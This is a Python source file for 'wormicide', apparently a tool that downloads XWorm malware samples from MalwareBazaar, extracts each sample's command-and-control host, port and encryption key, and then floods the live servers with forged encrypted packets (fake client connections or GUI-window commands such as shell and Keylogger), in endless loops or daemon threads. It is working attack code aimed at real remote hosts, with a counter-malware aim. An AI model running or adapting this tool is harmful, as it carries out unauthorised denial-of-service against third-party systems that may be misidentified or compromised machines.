import subprocess
import threading
import requests
import pyzipper
import datetime
import argparse
import random
import socket
import string
import xworm
import yaml
import os
import io


from time import sleep
from printer import *


APIKEY      = ""
ENDPOINT    = "https://mb-api.abuse.ch/api/v1/"
HEADERS     = {'API-KEY': APIKEY}
PASSWORD    = "infected".encode('utf-8')
ZIP_FILE    = os.path.join(os.getcwd(), 'samples', 'xclient.zip')
XCLIENT     = os.path.join(os.getcwd(), 'samples', 'xclient.exe')
XDUMP       = os.path.join(os.getcwd(), 'tools', 'xdump.exe')
LOG         = os.path.join(os.getcwd(), 'logs', 'extracted.yaml')
METHODS     = {"conspam": "",
               "winspam": ""}
THREADS     = []

parser = argparse.ArgumentParser(description=MAIN_DESC, formatter_class=argparse.RawTextHelpFormatter)
parser.usage = "python wormicide.py"
globals = parser.add_argument_group("Global Arguments")
globals.add_argument('-v', '--verbose', action='store_true', help=argparse.SUPPRESS)
globals.add_argument('-a', '--amount', type=int, help=argparse.SUPPRESS, default=50)
globals.add_argument('-t', '--timeout', type=int, help=argparse.SUPPRESS, default=5)
globals.add_argument('-s', '--source', type=str, choices=['api', 'log'], help=argparse.SUPPRESS, default='api')
globals.add_argument('-m', '--method', type=str, choices=METHODS.keys(), help=argparse.SUPPRESS, default='conspam')
globals.add_argument('-l', '--lockon', action='store_true', help=argparse.SUPPRESS)
globals.add_argument('-q', '--querytime', type=int, help=argparse.SUPPRESS, default=60)
globals.add_argument('--skipv', action='store_true', help=argparse.SUPPRESS)

methods = parser.add_argument_group("Connection Spam")
methods.add_argument('--total', type=int, default=None, help=argparse.SUPPRESS)

subparsers = parser.add_subparsers(title="modes", help=argparse.SUPPRESS, metavar='', dest="mode")

active_parser = subparsers.add_parser("active", help=argparse.SUPPRESS)
active_parser.add_argument('-d', '--daemon', action="store_true", help=argparse.SUPPRESS)

passive_parser = subparsers.add_parser("passive", help=argparse.SUPPRESS)
passive_parser.add_argument('--connect', action='store_true', help=argparse.SUPPRESS, default=False)

targeted_parser = subparsers.add_parser("targeted", help=argparse.SUPPRESS)
targeted_parser.add_argument('-b', '--binpath', type=str, help=argparse.SUPPRESS, default=None)
targeted_parser.add_argument('-i', '--host', help=argparse.SUPPRESS, type=str, default=None)
targeted_parser.add_argument('-p', '--port', help=argparse.SUPPRESS, default=7000)
targeted_parser.add_argument('-k', '--key', help=argparse.SUPPRESS, default='<123456789>')

args = parser.parse_args()


def api_post_request(data):
    
    """Performs a post request and returns the request object"""

    try:
        res = requests.post(ENDPOINT, headers=HEADERS, data=data)
    except Exception as ex:
        print_err(f"Failed on query_sample method with error: {ex}")
        exit(1)
    
    if res.status_code != 200:
        print_err(f"API response returned status code other than 200. Got code: {res.status_code}")
        exit(1)
    
    return res


def query_samples(limit) -> list:
    
    """Retrieve a list of sha256 hashes matching xworm from
    abuse.ch."""

    data = {
        'query' : 'get_taginfo',
        'tag'   : 'xworm',
        'limit' : int(limit),
    }
    
    print_info(f"Querying {str(limit)} samples from malware bazaar")

    samples = api_post_request(data).json()
    if samples['query_status'] == 'ok':

        print_verbose("API returned OK") if args.verbose else None

        queried = []
        count   = 0
        for sample in samples['data']:
            if sample['signature'] == 'XWorm' and sample['file_type'] == 'exe':
                queried.append({'sha256': sample['sha256_hash'], 'first_seen': sample['first_seen']})
                print_verbose(f'Got new sample hash, first seen: {sample["first_seen"]}, sha-256: {sample["sha256_hash"]}') if args.verbose else None
                count += 1
        
        print_good(f"API returned {len(samples['data'])} samples.")
        return queried
    
    else:
        print_err(f"Query status did not return ok. got status -> {samples['query_status']}")
        exit(1)


def download_sample(sha256_hash: str) -> None:  
    
    """Download, decrompress and write sample to disk in fixed location"""

    data = {
        'query'      : 'get_file',
        'sha256_hash': sha256_hash
    }

    print_verbose(f"Downloading sample with sha256 hash {sha256_hash}") if args.verbose else None

    file = api_post_request(data)
    try:   
        with open(ZIP_FILE, 'wb') as sample:
            for chunk in file.iter_content(chunk_size=8192):
                sample.write(chunk)

        with pyzipper.AESZipFile(ZIP_FILE) as sample:
            sample.pwd = PASSWORD
            file_info = sample.infolist()[0]
            with sample.open(file_info.filename) as source, open(XCLIENT, 'wb') as target:
                target.write(source.read())
        
        print_verbose("Wrote new sample to disk") if args.verbose else None
        return True
    
    except Exception as ex:
        print_err(f"Sample download failed with exception: {ex}")
        return False
                

def retrieve_logs() -> dict:

    """Returns data that was previously extracted from log files"""

    samples = []

    with open(LOG, 'r') as file:
        data = yaml.safe_load(file.read())

    for _, dict in data.items():
        samples.append(dict)
    
    print_verbose("Retrieved past analysis data from logs") if args.verbose else None
    return samples


def log_config(config: dict, hash: str) -> None:

    """Logs configuration data from the client to yaml file where the 
    hash is the key for the sample"""

    config['sha256'] = hash
    data = {hash: config}

    with open(LOG, 'r') as file:
        current_data = yaml.safe_load(file.read()) or {}
    
    current_data.update(data)

    with open(LOG, 'w') as file:
        yaml.dump(current_data, file)

    print_verbose("Logged new configuration") if args.verbose else None


def extract_config(binary=None, first_seen: str="") -> list or None:

    """Run xdump on the sample, extract config and return as an array. """

    target = XCLIENT if binary is None else binary

    proc = subprocess.Popen(f"{XDUMP} {target}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out  = proc.stdout.read().decode()
    temp = []
    count  = 0
    for line in out.splitlines():
        if 'Decrypted Data' in line:
            
            # Make sure that config isn't a pastebin link
            if 'pastebin' in line[16:]:
                return None
            else:
                temp.append(line[16:])
                count += 1
        
        if count == 3:
            break
    
    os.remove(XCLIENT) and os.remove(ZIP_FILE) if binary is None else None
    if len(temp) >= 3:
        return {"host": temp[0], "port": temp[1], "key": temp[2], "first_seen": first_seen}
    else:
        print_err("Failed to extract configuration from sample") if args.verbose else None
        return None
    

def scan_port(host: str, port: str, key: str) -> bool:
    
    """Checks if a port is open or close, returns true for open."""

    print_verbose(f"Scanning port on {host}:{port}") if args.verbose else None
    
    status = False
    port = int(port)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(args.timeout)
        result = sock.connect_ex((host, port))
        if result == 0:
            
            print_good(f'Host online! {host} Port: {port} key: {key}')
            if not args.skipv:
                print_proc("Valdating target is xworm server...")
                send_packet('FileM;', sock, key)
                
                if xworm.decrypt(xworm.xrecv(sock, int(xworm.xrecvtill0(sock))), key.encode()).decode() == 'GetDrives':
                    print_good("Got expected data back! Targeted confirmed to be serving Xworm")
                    status = True
                
                else:
                    print_err("Failed to get expected data from xworm server. Target is not serving xworm.")

            elif args.skipv:
                status = True
        else:
            print_verbose("Host is offline.") if args.verbose and result != 0 else None
    except socket.timeout:
        print_err(f"{host}:{port} failed to respond to validation packet.")

    except socket.error:
        print_err(f"{host}:{port} raised socket.error")
    
    except Exception as ex:
        print_err(f"Exception occurred during port scan: {ex}")

    sock.shutdown(socket.SHUT_RDWR) if status is True else None
    sock.close()
    del sock
    return status

def handle_attack(host: str, port: str, key: str) -> bool:

    """Handler method for the attack"""

    print_proc("Checking xworm server connectivity...")
    if host in ["127.0.0.1", "localhost"]:
        print_err(f"Received invalid host address -> {host}, aborting...")
        return False
    
    elif scan_port(host, port, key):
        print_good(f"Proceeding with attack method: {args.method}")
        return True
    else:
        print_err("Server offline, aborting...")
        return False


def scan(amount) -> None:
    
    """Query samples from malware bazaar api, extract config and check the port
    on the host. Log the data."""

    print_proc(f"Starting {args.mode} scan using data source: {args.source}")

    if args.source == "api":
        data_source = query_samples(amount)
    elif args.source == "log":
        data_source = retrieve_logs()

    extractions = 0
    failed      = 0
    online      = 0
    offline     = 0
    scanned     = 0

    for sample in data_source:
       
        if args.source == 'api':
            download_sample(sample['sha256'])
            data = extract_config(first_seen=sample['first_seen'])
       
        elif args.source == 'log':
            data = sample

        if data is not None:
            print_info(f'Extracted new configuration. Host: {data["host"]} Port: {data["port"]} Key: {data["key"]}') if args.mode == "passive" and args.connect is False or args.mode == "active" else None
            
            if args.mode == "passive":
                if args.connect:
                    if scan_port(data["host"], data["port"], data["key"]) is True:
                        data["status"] = "online"
                        online += 1
                    else:
                        data["status"] = "offline"
                        offline += 1

            elif args.mode == "active":
                if handle_attack(data["host"], data["port"], data["key"]):
                    create_thread(METHODS[args.method], (data["host"], data["port"], data["key"])) if args.daemon else METHODS[args.method](data["host"], data["port"], data["key"])

            data["updated"] = datetime.datetime.now().strftime('%Y-%m-%d, %H:%M')
            log_config(data, sample['sha256'])
            extractions += 1

            scanned += 1
            if scanned == args.amount:
                break

        else:
            failed += 1
    
    print_good(f"Completed scan of {str(amount)} samples. {str(extractions)} configs were extracted. Failed to extract {str(failed)} configurations.")
    print_good(f"{str(online)} hosts are up. {offline} hosts are down.") if args.mode == 'passive' and args.connect is True else None



def targeted_attack(host=None, port=None, key=None, binary=None) -> None:

    """Target a single instance of an xworm server."""

    if binary is not None:
        target = extract_config(binary=binary)
        if target is not None:
            host = target['host']
            port = target['port']
            key  = target['key']
            print_info(f'Extracted target info -> {host}:{port} key: {key}. Checking connectivity...')
            if handle_attack(host, port):
                METHODS[args.method](host, port, key) 
        else:
            print_err('Failed to extract configuration from binary.')
    
    elif binary is None:
        print_info(f'Received target info -> {host}:{port} key: {key}')        
        if handle_attack(host, port, key):
            METHODS[args.method](host, port, key)


def rand_string() -> str:
    """Builds a random string of 10 char"""
    return ''.join(random.choice(string.ascii_letters) for _  in range(10))


def build_info_string() -> str:
    """Construct information packet string for xworm"""
    string = "INFO"
    for i in range(8):
        string += f';{rand_string()}'
    return string


def build_window_string():
    
    """Create packet data to pop random window on screen"""

    windows = ["shell;",
            "FileM;",
            "hrdp;",
            "Clipboard;",
            "RevProxy;",
            "Keylogger;",
            "Information;",
            "Programs;",
            "MICCM;",
            "ServiceManager;",
            "Registry;",
            "ppp;",
            "maps;",
            "TCPConnection;",
            "FileSeacher;"
            ]
    return random.choice(windows) + rand_string()


def spam_windows(host, port, key):

    """Spam the server with new windows for various gui components of the application."""

    while True:
        try:
            send_attack_packet(host, port, key)
        
        except ConnectionRefusedError:
            print_err("Server is no longer online!")
            break
        
        except Exception as ex:
            print_err(f"An exception occurred during the connection to {host}:{port}. Ex: {ex}")
            break
        
        if args.lockon:
            print_proc(f"Re-initiating attack on {host}:{port}")
            spam_connections(host, port, key)

        
def send_attack_packet(host, port, key) -> None:

    """ Craft and send malicious packet to xworm server"""
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, int(port)))
    
    if args.method == "winspam":
        packet_data = build_window_string()
    elif args.method == "conspam":
        packet_data = build_info_string()
    
    send_packet(packet_data, sock, key)
    sock.shutdown(socket.SHUT_RDWR)
    sock.close()
    del sock


def send_packet(packet_data: str, socket, key):

    """Send xworm server processable packet"""

    buf = io.BytesIO()
    xworm.write_all_to_stream(xworm.parse_packet_line(packet_data), key.encode(), buf)
    
    socket.sendall(buf.getbuffer()) 


def spam_connections(host, port, key):

    """Spam the server with connections for a specified amount
    or an unlimited amount. """

    print_proc(f'Starting connection spam on {host}:{port}')

    amount = args.total
    try:
        if amount != None:
            for i in range(int(amount)):
                send_attack_packet(host, port, key)
        
        elif amount is None:
            while True:
                send_attack_packet(host, port, key)

    except ConnectionRefusedError:
        print_err("XWorm server no longer available")

    except Exception as ex:
        print_err(f"Received error during attack. info -> {ex}")
    
    if args.lockon:
        print_proc(f"Re-initiating attack on {host}:{port}")
        spam_connections(host, port, key)


def create_thread(attack_method, args: tuple) -> threading.Thread:

    """Creates new thread and executes task in the background"""

    print_proc(f"Starting new thread")
    thread = threading.Thread(target=attack_method, args=args, daemon=True)
    data = {'thread': thread, 'target': f'{args[0]}:{args[1]}'}
    THREADS.append(data)
    thread.start()


def query_threads() -> None:

    """Query thrad status and print information"""

    while True:

        if len(THREADS) == 0:
            print_info("No more threads exist, quitting...")
            break

        print_info(f"{len(THREADS)} threads are executing in the background...")

        for thread in THREADS:
            print_verbose("Querying thread status...") if args.verbose else None
            
            if not thread['thread'].is_alive():
                THREADS.remove(thread)
                print_verbose("Thread is dead, has been removed...") if args.verbose else None

            else:
                print_info(f'{args.method} attack continues on {thread["target"]}')

        sleep(args.querytime)


if __name__ == "__main__":

    METHODS['conspam'] = spam_connections
    METHODS['winspam'] = spam_windows

    print_banner()

    try:
        if args.mode in ["passive", "active"]:
            scan(args.amount)
            
            if args.mode == 'active' and args.daemon is True and len(THREADS) >= 1:
                query_threads()
    
        elif args.mode == "targeted":
            targeted_attack(binary=args.binpath, host=args.host, port=args.port, key=args.key)
        elif args.mode is None:
            print_err("No mode of operation was specified.")

    except KeyboardInterrupt:
        exit("Detected keyboard interrupt. Quitting.")

